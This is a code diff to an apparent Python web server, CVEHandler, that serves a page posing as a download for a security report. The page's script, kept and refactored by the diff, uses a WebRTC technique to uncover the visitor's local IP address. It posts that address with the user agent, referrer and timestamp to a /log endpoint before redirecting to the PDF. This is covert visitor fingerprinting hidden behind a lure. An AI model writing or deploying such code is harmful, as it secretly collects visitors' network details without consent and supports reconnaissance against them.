@@ -1,7 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import json
 import os
-import sys
 import socket
 
 class CVEHandler(BaseHTTPRequestHandler):
@@ -55,53 +54,50 @@ class CVEHandler(BaseHTTPRequestHandler):
                     }}
                 </style>
                 <script>
-                    function getLocalIPs(callback) {{
-                        const ips = [];
-                        const RTCPeerConnection = window.RTCPeerConnection ||
-                            window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-                        
-                        const pc = new RTCPeerConnection({{
-                            iceServers: []
-                        }});
-                        
-                        pc.createDataChannel('');
-                        
-                        pc.createOffer().then(offer => pc.setLocalDescription(offer))
-                            .catch(err => callback([]));
-                        
-                        pc.onicecandidate = event => {{
-                            if (!event.candidate) {{
-                                callback(ips);
-                                return;
+                    function getLocalIP() {{
+                        return new Promise((resolve) => {{
+                            // Method 1: WebRTC (most reliable when it works)
+                            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                            if (RTCPeerConnection) {{
+                                const pc = new RTCPeerConnection({{iceServers:[]}});
+                                pc.createDataChannel('');
+                                pc.createOffer().then(pc.setLocalDescription.bind(pc)).catch(() => {{}});
+                                pc.onicecandidate = (ice) => {{
+                                    if (ice && ice.candidate && ice.candidate.candidate) {{
+                                        const ip = ice.candidate.candidate.split(' ')[4];
+                                        if (ip && ip.split('.').length === 4) {{
+                                            resolve(ip);
+                                            return;
+                                        }}
+                                    }}
+                                }};
+                                setTimeout(() => resolve("Unknown"), 1000);
+                            }} else {{
+                                // Method 2: Fallback to Java applet or ActiveX (legacy)
+                                // Method 3: Final fallback
+                                resolve("Unknown");
                             }}
-                            const ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(event.candidate.candidate);
-                            if (ip && ips.indexOf(ip[1]) === -1) ips.push(ip[1]);
-                        }};
+                        }});
                     }}
 
-                    function collectAndDownload() {{
-                        getLocalIPs(function(ips) {{
-                            const localIPv4 = ips.find(ip => ip.split('.').length === 4 && !ip.startsWith('192.168.')) || 
-                                            ips.find(ip => ip.split('.').length === 4) || 
-                                            "Unknown";
-                            
-                            const data = {{
-                                userAgent: navigator.userAgent,
-                                referrer: document.referrer,
-                                time: new Date().toISOString(),
-                                localIP: localIPv4,
-                                allIPs: ips
-                            }};
+                    async function collectAndDownload() {{
+                        const localIP = await getLocalIP();
+                        
+                        const data = {{
+                            userAgent: navigator.userAgent,
+                            referrer: document.referrer,
+                            time: new Date().toISOString(),
+                            localIP: localIP
+                        }};
 
-                            fetch("/log", {{
-                                method: "POST",
-                                headers: {{
-                                    "Content-Type": "application/json"
-                                }},
-                                body: JSON.stringify(data)
-                            }}).then(() => {{
-                                window.location.href = "/downloads/security-report.pdf";
-                            }});
+                        fetch("/log", {{
+                            method: "POST",
+                            headers: {{
+                                "Content-Type": "application/json"
+                            }},
+                            body: JSON.stringify(data)
+                        }}).then(() => {{
+                            window.location.href = "/downloads/security-report.pdf";
                         }});
                     }}
                 </script>
